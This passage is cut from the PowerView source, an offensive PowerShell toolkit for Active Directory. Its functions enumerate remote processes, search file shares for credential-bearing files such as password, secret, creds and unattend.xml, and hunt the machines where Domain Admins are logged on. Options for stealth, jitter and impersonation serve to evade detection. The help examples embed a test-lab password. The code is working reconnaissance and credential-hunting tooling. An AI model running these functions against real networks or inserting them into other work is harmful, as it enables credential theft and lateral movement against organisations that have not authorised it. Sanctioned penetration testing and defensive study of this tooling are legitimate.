$SecPassword)\nGet-WMIProcess -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.UserProcess\n\nA PSCustomObject containing the remote process information.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.UserProcess')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            try {\n                $WmiArguments = @{\n                    'ComputerName' = $ComputerName\n                    'Class' = 'Win32_process'\n                }\n                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n                Get-WMIobject @WmiArguments | ForEach-Object {\n                    $Owner = $_.getowner();\n                    $Process = New-Object PSObject\n                    $Process | Add-Member Noteproperty 'ComputerName' $Computer\n                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName\n                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID\n                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain\n                    $Process | Add-Member Noteproperty 'User' $Owner.User\n                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')\n                    $Process\n                }\n            }\n            catch {\n                Write-Verbose \"[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Find-InterestingFile {\n<#\n.SYNOPSIS\n\nSearches for files on the given path that match a series of specified criteria.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Add-RemoteConnection, Remove-RemoteConnection  \n\n.DESCRIPTION\n\nThis function recursively searches a given UNC path for files with\nspecific keywords in the name (default of pass, sensitive, secret, admin,\nlogin and unattend*.xml). By default, hidden files/folders are included\nin search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection\nis used to temporarily map the remote share.\n\n.PARAMETER Path\n\nUNC/local path to recursively search.\n\n.PARAMETER Include\n\nOnly return files/folders that match the specified array of strings,\ni.e. @(*.doc*, *.xls*, *.ppt*)\n\n.PARAMETER LastAccessTime\n\nOnly return files with a LastAccessTime greater than this date value.\n\n.PARAMETER LastWriteTime\n\nOnly return files with a LastWriteTime greater than this date value.\n\n.PARAMETER CreationTime\n\nOnly return files with a CreationTime greater than this date value.\n\n.PARAMETER OfficeDocs\n\nSwitch. Search for office documents (*.doc*, *.xls*, *.ppt*)\n\n.PARAMETER FreshEXEs\n\nSwitch. Find .EXEs accessed within the last 7 days.\n\n.PARAMETER ExcludeFolders\n\nSwitch. Exclude folders from the search results.\n\n.PARAMETER ExcludeHidden\n\nSwitch. Exclude hidden files and folders from the search results.\n\n.PARAMETER CheckWriteAccess\n\nSwitch. Only returns files the current user has write access to.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nto connect to remote systems for file enumeration.\n\n.EXAMPLE\n\nFind-InterestingFile -Path \"C:\\Backup\\\"\n\nReturns any files on the local path C:\\Backup\\ that have the default\nsearch term set in the title.\n\n.EXAMPLE\n\nFind-InterestingFile -Path \"\\\\WINDOWS7\\Users\\\" -LastAccessTime (Get-Date).AddDays(-7)\n\nReturns any files on the remote path \\\\WINDOWS7\\Users\\ that have the default\nsearch term set in the title and were accessed within the last week.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-InterestingFile -Credential $Cred -Path \"\\\\PRIMARY.testlab.local\\C$\\Temp\\\"\n\n.OUTPUTS\n\nPowerView.FoundFile\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.FoundFile')]\n    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Path = '.\\',\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('SearchTerms', 'Terms')]\n        [String[]]\n        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $LastAccessTime,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $LastWriteTime,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $CreationTime,\n\n        [Parameter(ParameterSetName = 'OfficeDocs')]\n        [Switch]\n        $OfficeDocs,\n\n        [Parameter(ParameterSetName = 'FreshEXEs')]\n        [Switch]\n        $FreshEXEs,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [Switch]\n        $ExcludeFolders,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [Switch]\n        $ExcludeHidden,\n\n        [Switch]\n        $CheckWriteAccess,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments =  @{\n            'Recurse' = $True\n            'ErrorAction' = 'SilentlyContinue'\n            'Include' = $Include\n        }\n        if ($PSBoundParameters['OfficeDocs']) {\n            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')\n        }\n        elseif ($PSBoundParameters['FreshEXEs']) {\n            # find .exe's accessed within the last 7 days\n            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')\n            $SearcherArguments['Include'] = @('*.exe')\n        }\n        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']\n\n        $MappedComputers = @{}\n\n        function Test-Write {\n            # short helper to check is the current user can write to a file\n            [CmdletBinding()]Param([String]$Path)\n            try {\n                $Filetest = [IO.File]::OpenWrite($Path)\n                $Filetest.Close()\n                $True\n            }\n            catch {\n                $False\n            }\n        }\n    }\n\n    PROCESS {\n        ForEach ($TargetPath in $Path) {\n            if (($TargetPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {\n                $HostComputer = (New-Object System.Uri($TargetPath)).Host\n                if (-not $MappedComputers[$HostComputer]) {\n                    # map IPC$ to this computer if it's not already\n                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential\n                    $MappedComputers[$HostComputer] = $True\n                }\n            }\n\n            $SearcherArguments['Path'] = $TargetPath\n            Get-ChildItem @SearcherArguments | ForEach-Object {\n                # check if we're excluding folders\n                $Continue = $True\n                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {\n                    Write-Verbose \"Excluding: $($_.FullName)\"\n                    $Continue = $False\n                }\n                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {\n                    $Continue = $False\n                }\n                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {\n                    $Continue = $False\n                }\n                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {\n                    $Continue = $False\n                }\n                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {\n                    $Continue = $False\n                }\n                if ($Continue) {\n                    $FileParams = @{\n                        'Path' = $_.FullName\n                        'Owner' = $((Get-Acl $_.FullName).Owner)\n                        'LastAccessTime' = $_.LastAccessTime\n                        'LastWriteTime' = $_.LastWriteTime\n                        'CreationTime' = $_.CreationTime\n                        'Length' = $_.Length\n                    }\n                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams\n                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')\n                    $FoundFile\n                }\n            }\n        }\n    }\n\n    END {\n        # remove the IPC$ mappings\n        $MappedComputers.Keys | Remove-RemoteConnection\n    }\n}\n\n\n########################################################\n#\n# 'Meta'-functions start below\n#\n########################################################\n\nfunction New-ThreadedFunction {\n    # Helper used by any threaded host enumeration functions\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [String[]]\n        $ComputerName,\n\n        [Parameter(Position = 1, Mandatory = $True)]\n        [System.Management.Automation.ScriptBlock]\n        $ScriptBlock,\n\n        [Parameter(Position = 2)]\n        [Hashtable]\n        $ScriptParameters,\n\n        [Int]\n        [ValidateRange(1,  100)]\n        $Threads = 20,\n\n        [Switch]\n        $NoImports\n    )\n\n    BEGIN {\n        # Adapted from:\n        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/\n        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()\n\n        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()\n        # force a single-threaded apartment state (for token-impersonation stuffz)\n        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA\n\n        # import the current session state's variables and functions so the chained PowerView\n        #   functionality can be used by the threaded blocks\n        if (-not $NoImports) {\n            # grab all the current variables for this runspace\n            $MyVars = Get-Variable -Scope 2\n\n            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice\n            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')\n\n            # add Variables from Parent Scope (current runspace) into the InitialSessionState\n            ForEach ($Var in $MyVars) {\n                if ($VorbiddenVars -NotContains $Var.Name) {\n                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))\n                }\n            }\n\n            # add Functions from current runspace to the InitialSessionState\n            ForEach ($Function in (Get-ChildItem Function:)) {\n                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))\n            }\n        }\n\n        # threading adapted from\n        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407\n        #   Thanks Carlos!\n\n        # create a pool of maxThread runspaces\n        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)\n        $Pool.Open()\n\n        # do some trickery to get the proper BeginInvoke() method that allows for an output queue\n        $Method = $Null\n        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {\n            $MethodParameters = $M.GetParameters()\n            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {\n                $Method = $M.MakeGenericMethod([Object], [Object])\n                break\n            }\n        }\n\n        $Jobs = @()\n        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}\n        Write-Verbose \"[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)\"\n\n        # partition all hosts from -ComputerName into $Threads number of groups\n        if ($Threads -ge $ComputerName.Length) {\n            $Threads = $ComputerName.Length\n        }\n        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)\n        $ComputerNamePartitioned = @()\n        $Start = 0\n        $End = $ElementSplitSize\n\n        for($i = 1; $i -le $Threads; $i++) {\n            $List = New-Object System.Collections.ArrayList\n            if ($i -eq $Threads) {\n                $End = $ComputerName.Length\n            }\n            $List.AddRange($ComputerName[$Start..($End-1)])\n            $Start += $ElementSplitSize\n            $End += $ElementSplitSize\n            $ComputerNamePartitioned += @(,@($List.ToArray()))\n        }\n\n        Write-Verbose \"[New-ThreadedFunction] Total number of threads/partitions: $Threads\"\n\n        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {\n            # create a \"powershell pipeline runner\"\n            $PowerShell = [PowerShell]::Create()\n            $PowerShell.runspacepool = $Pool\n\n            # add the script block + arguments with the given computer partition\n            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)\n            if ($ScriptParameters) {\n                ForEach ($Param in $ScriptParameters.GetEnumerator()) {\n                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)\n                }\n            }\n\n            # create the output queue\n            $Output = New-Object Management.Automation.PSDataCollection[Object]\n\n            # kick off execution using the BeginInvok() method that allows queues\n            $Jobs += @{\n                PS = $PowerShell\n                Output = $Output\n                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))\n            }\n        }\n    }\n\n    END {\n        Write-Verbose \"[New-ThreadedFunction] Threads executing\"\n\n        # continuously loop through each job queue, consuming output as appropriate\n        Do {\n            ForEach ($Job in $Jobs) {\n                $Job.Output.ReadAll()\n            }\n            Start-Sleep -Seconds 1\n        }\n        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)\n\n        $SleepSeconds = 100\n        Write-Verbose \"[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup...\"\n\n        # cleanup- make sure we didn't miss anything\n        for ($i=0; $i -lt $SleepSeconds; $i++) {\n            ForEach ($Job in $Jobs) {\n                $Job.Output.ReadAll()\n                $Job.PS.Dispose()\n            }\n            Start-Sleep -S 1\n        }\n\n        $Pool.Dispose()\n        Write-Verbose \"[New-ThreadedFunction] all threads completed\"\n    }\n}\n\n\nfunction Find-DomainUserLocation {\n<#\n.SYNOPSIS\n\nFinds domain machines where specific users are logged into.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and queries the domain for users of a specified group\n(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the\nfunction enumerates any active user sessions with Get-NetSession/Get-NetLoggedon\nThe found user list is compared against the target list, and any matches are\ndisplayed. If -ShowAll is specified, all results are displayed instead of\nthe filtered set. If -Stealth is specified, then likely highly-trafficed servers\nare enumerated with Get-DomainFileServer/Get-DomainController, and session\nenumeration is executed only against those servers. If -Credential is passed,\nthen Invoke-UserImpersonation is used to impersonate the specified user\nbefore enumeration, reverting after with Invoke-RevertToSelf.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER Domain\n\nSpecifies the domain to query for computers AND users, defaults to the current domain.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerUnconstrained\n\nSwitch. Search computer objects that have unconstrained delegation.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER UserIdentity\n\nSpecifies one or more user identities to search for.\n\n.PARAMETER UserDomain\n\nSpecifies the domain to query for users to search for, defaults to the current domain.\n\n.PARAMETER UserLDAPFilter\n\nSpecifies an LDAP query string that is used to search for target users.\n\n.PARAMETER UserSearchBase\n\nSpecifies the LDAP source to search through for target users.\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER UserGroupIdentity\n\nSpecifies a group identity to query for target users, defaults to 'Domain Admins.\nIf any other user specifications are set, then UserGroupIdentity is ignored.\n\n.PARAMETER UserAdminCount\n\nSwitch. Search for users users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER UserAllowDelegation\n\nSwitch. Search for user accounts that are not marked as 'sensitive and not allowed for delegation'.\n\n.PARAMETER CheckAccess\n\nSwitch. Check if the current user has local admin access to computers where target users are found.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER StopOnSuccess\n\nSwitch. Stop hunting after finding after finding a target user.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER ShowAll\n\nSwitch. Return all user location results instead of filtering based on target\nspecifications.\n\n.PARAMETER Stealth\n\nSwitch. Only enumerate sessions from connonly used target servers.\n\n.PARAMETER StealthSource\n\nThe source of target servers to use, 'DFS' (distributed file servers),\n'DC' (domain controllers), 'File' (file servers), or 'All' (the default).\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-DomainUserLocation\n\nSearches for 'Domain Admins' by enumerating every computer in the domain.\n\n.EXAMPLE\n\nFind-DomainUserLocation -Stealth -ShowAll\n\nEnumerates likely highly-trafficked servers, performs just session enumeration\nagainst each, and outputs all results.\n\n.EXAMPLE\n\nFind-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local\n\nEnumerates Windows 7 computers in dev.testlab.local and returns user results for privileged\nusers in dev.testlab.local.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-DomainUserLocation -Domain testlab.local -Credential $Cred\n\nSearches for domain admin locations in the testlab.local using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.UserLocation\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.UserLocation')]\n    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [Alias('Unconstrained')]\n        [Switch]\n        $ComputerUnconstrained,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Parameter(ParameterSetName = 'UserIdentity')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $UserIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserSearchBase,\n\n        [Parameter(ParameterSetName = 'UserGroupIdentity')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('GroupName', 'Group')]\n        [String[]]\n        $UserGroupIdentity = 'Domain Admins',\n\n        [Alias('AdminCount')]\n        [Switch]\n        $UserAdminCount,\n\n        [Alias('AllowDelegation')]\n        [Switch]\n        $UserAllowDelegation,\n\n        [Switch]\n        $CheckAccess,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $StopOnSuccess,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Parameter(ParameterSetName = 'ShowAll')]\n        [Switch]\n        $ShowAll,\n\n        [Switch]\n        $Stealth,\n\n        [String]\n        [ValidateSet('DFS', 'DC', 'File', 'All')]\n        $StealthSource = 'All',\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        $UserSearcherArguments = @{\n            'Properties' = 'samaccountname'\n        }\n        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }\n        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }\n        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }\n        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }\n        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }\n        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }\n        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }\n\n        $TargetComputers = @()\n\n        # first, build the set of computers to enumerate\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = @($ComputerName)\n        }\n        else {\n            if ($PSBoundParameters['Stealth']) {\n                Write-Verbose \"[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource\"\n                $TargetComputerArrayList = New-Object System.Collections.ArrayList\n\n                if ($StealthSource -match 'File|All') {\n                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'\n                    $FileServerSearcherArguments = @{}\n                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }\n                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }\n                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }\n                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }\n                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }\n                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }\n                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments\n                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }\n                    $TargetComputerArrayList.AddRange( $FileServers )\n                }\n                if ($StealthSource -match 'DFS|All') {\n                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'\n                    # # TODO: fix the passed parameters to Get-DomainDFSShare\n                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}\n                }\n                if ($StealthSource -match 'DC|All') {\n                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'\n                    $DCSearcherArguments = @{\n                        'LDAP' = $True\n                    }\n                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }\n                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }\n                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }\n                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }\n                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname\n                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }\n                    $TargetComputerArrayList.AddRange( $DomainControllers )\n                }\n                $TargetComputers = $TargetComputerArrayList.ToArray()\n            }\n            else {\n                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'\n                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n            }\n        }\n        Write-Verbose \"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainUserLocation] No hosts found to enumerate'\n        }\n\n        # get the current user so we can ignore it in the results\n        if ($PSBoundParameters['Credential']) {\n            $CurrentUser = $Credential.GetNetworkCredential().UserName\n        }\n        else {\n            $CurrentUser = ([Environment]::UserName).ToLower()\n        }\n\n        # now build the user target set\n        if ($PSBoundParameters['ShowAll']) {\n            $TargetUsers = @()\n        }\n        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {\n            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname\n        }\n        else {\n            $GroupSearcherArguments = @{\n                'Identity' = $UserGroupIdentity\n                'Recurse' = $True\n            }\n            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }\n            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }\n            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }\n            if 